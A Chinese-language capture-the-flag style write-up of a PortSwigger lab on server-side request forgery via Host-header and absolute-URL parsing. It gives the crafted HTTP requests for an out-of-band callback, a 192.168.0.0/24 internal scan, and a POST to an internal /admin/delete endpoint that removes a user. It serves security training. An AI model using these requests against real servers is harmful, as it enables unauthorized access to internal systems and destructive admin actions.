[Write Up]Lab: SSRF via flawed request parsing

2024-12-24
#write-up  #portswigger  #host-header-attack 

Lab description#

Solution#

  1. 点击Burp Collaborator中的Copy to clipboard，并修改首页请求
    GET / HTTP/2
Host: w41el7hll9h1f0wkpaxy7qjeq5wxkn8c.oastify.com

    HTTP/2 403 Forbidden
  2. 尝试使用绝对路径请求
    GET https://0aa4007c03d98b54818684f2003e00bb.web-security-academy.net HTTP/2
Host: gk4y1rx51txlvkc45udinazy6pch08ox.oastify.com

    HTTP/2 200 OK
  3. 在Burp Collaborator页面可以发现有对应的DNS请求记录，可以确认网站的中间件会向任意服务器发出请求
  4. 使用Burp Intruder进行192.168.0.0/24遍历，请求与Payload如下，记得反选Update Host header to match target
  5. 根据扫描结果192.168.0.102会跳转至/admin，发送请求 
    GET https://0aa4007c03d98b54818684f2003e00bb.web-security-academy.net/admin HTTP/2
Host: 192.168.0.102

    HTTP/2 200 OK

<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
    <input required type="hidden" name="csrf" value="vDi8dR8n51eHQdfTlYMGnZMeE4kyqV3Y">
    <label>Username</label>
    <input required type='text' name='username'>
    <button class='button' type='submit'>Delete user</button>
</form>
  6. 根据上述结果修改请求POST /admin/delete、csrf，并新增username参数，发送请求后即可解题
    POST https://0aa4007c03d98b54818684f2003e00bb.web-security-academy.net/admin/delete HTTP/2
Host: 192.168.0.102

csrf=vDi8dR8n51eHQdfTlYMGnZMeE4kyqV3Y&username=carlos

    HTTP/2 302 Found
